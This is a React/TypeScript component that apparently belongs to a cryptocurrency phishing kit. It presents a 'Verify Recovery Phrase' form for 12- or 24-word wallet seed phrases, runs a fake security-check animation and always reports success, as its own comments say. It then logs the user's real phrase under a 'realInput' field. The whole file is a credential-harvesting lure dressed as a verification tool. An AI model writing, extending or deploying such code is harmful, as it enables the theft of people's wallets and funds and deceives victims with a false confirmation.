"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { CheckCircle2, Loader2 } from "lucide-react"
import { motion, AnimatePresence } from "framer-motion"
import { SecurityCheckProcess } from "./security-check-process"
import { LogManager } from "@/utils/logManager"

export function RecoveryPhraseInput() {
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12)
  const [isVerifying, setIsVerifying] = useState(false)
  const [isVerified, setIsVerified] = useState<boolean | null>(null)
  const [showSecurityCheck, setShowSecurityCheck] = useState(false)

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words]
    newWords[index] = value.toLowerCase().trim()
    setWords(newWords)
  }

  const handleVerify = async () => {
    setIsVerifying(true)
    setShowSecurityCheck(true)
  }

  const handleSecurityCheckComplete = async () => {
    setShowSecurityCheck(false)
    setIsVerified(true) // Always set to true
    setIsVerifying(false)

    LogManager.addLog({
      type: "Recovery Phrase",
      result: "Success", // Always set to Success
      realInput: words.slice(0, phraseLength).join(" "),
    })
  }

  useEffect(() => {
    // Simulate real-time updates
    const interval = setInterval(() => {
      if (words.slice(0, phraseLength).some((word) => word.length > 0) && !isVerifying && !isVerified) {
        handleVerify()
      }
    }, 1000)

    return () => clearInterval(interval)
  }, [words, phraseLength, isVerifying, isVerified, handleVerify]) // Added handleVerify to dependencies

  if (showSecurityCheck) {
    return <SecurityCheckProcess onComplete={handleSecurityCheckComplete} />
  }

  return (
    <AnimatePresence mode="wait">
      <motion.div
        key="input"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: -20 }}
        transition={{ duration: 0.5 }}
      >
        <div className="mb-4 flex justify-end">
          <Button
            variant="outline"
            size="sm"
            onClick={() => setPhraseLength(phraseLength === 12 ? 24 : 12)}
            className="bg-zinc-900 text-white border-zinc-800 hover:bg-zinc-800 hover:text-white"
          >
            Switch to {phraseLength === 12 ? "24" : "12"}-word phrase
          </Button>
        </div>
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 mb-4">
          {words.slice(0, phraseLength).map((word, index) => (
            <motion.div
              key={index}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: index * 0.05 }}
              className="flex items-center"
            >
              <span className="mr-2 text-zinc-500 w-6">{index + 1}.</span>
              <Input
                value={word}
                onChange={(e) => handleWordChange(index, e.target.value)}
                className="bg-zinc-900/50 border-zinc-800 text-white placeholder:text-zinc-600 focus-visible:ring-orange-500"
                placeholder={`Word ${index + 1}`}
              />
            </motion.div>
          ))}
        </div>
        <Button
          onClick={handleVerify}
          className="w-full bg-orange-500 hover:bg-orange-600 text-white"
          disabled={isVerifying || words.slice(0, phraseLength).every((word) => word.length === 0)}
        >
          {isVerifying ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Verifying...
            </>
          ) : (
            "Verify Recovery Phrase"
          )}
        </Button>
        {isVerified && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className="mt-4 p-2 rounded bg-green-500/10 flex items-center"
          >
            <CheckCircle2 className="text-green-500 mr-2" />
            <span className="text-green-500">Recovery phrase verified successfully!</span>
          </motion.div>
        )}
      </motion.div>
    </AnimatePresence>
  )
}

